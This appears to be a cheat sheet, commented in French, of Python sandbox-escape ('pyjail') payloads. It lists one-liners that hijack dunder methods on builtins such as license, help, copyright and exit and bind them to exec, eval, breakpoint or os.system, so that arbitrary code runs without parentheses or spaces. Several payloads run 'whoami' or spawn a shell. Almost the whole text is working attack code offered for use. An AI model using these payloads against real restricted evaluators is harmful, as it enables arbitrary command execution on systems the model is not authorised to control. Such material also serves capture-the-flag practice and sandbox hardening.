```py -cwn
# comprehension de liste (exec & eval)
[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]]
[obj["print(123)"] for obj.__class__.__getitem__ in [eval]]

# depuis les modules builtin (exec & eval) - <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>
[f"{license}" for license._Printer__setup in [breakpoint]]

# d'autres moyens de bypass les parentheses
[f"{copyright}" for copyright.__class__.__str__ in [breakpoint]]
[+license for license.__class__.__pos__ in [breakpoint]]
[-quit for quit.__class__.__neg__ in [breakpoint]]
[help["ls"] for help.__class__.__getitem__ in [system]]

# sans espace :)
[[copyright.sh]for[[[copyright.__class__.__getattr__]]]in[[[[copyright.os.system]for[copyright.__class__.__getattr__]in[[__import__]]]]]]
[[help[quit[license]]]for[help.__class__.__getitem__]in[[eval]for[quit.__class__.__getitem__]in[[input]]]]
[[[help[quit[[]]]]for[quit.__class__.__getitem__]in[[input]]]for[help.__class__.__getitem__]in[[eval]]]

# @hashkitten (exec)
from os import system as __getattr__; from __main__ import sh

# ADD - addition de string
exit.__class__.__add__ = exec; exit + "import os; os.system\x28'whoami'\x29"
# SUB - soustraction de string
exit.__class__.__sub__ = exec; exit - "import os; os.system\x28'whoami'\x29"
# MUL - multiplication de string
exit.__class__.__mul__ = exec; exit * "import os; os.system\x28'whoami'\x29"
# DIV - division de string
exit.__class__.__div__ = exec; exit / "import os; os.system\x28'whoami'\x29"
# MOD - modulo de string
exit.__class__.__mod__ = exec; exit % "import os; os.system\x28'whoami'\x29"

# bypass de property
class Test:
   @property
   def aFunction(self):
        print("you called this function")
test = Test()
test.aFunction
```
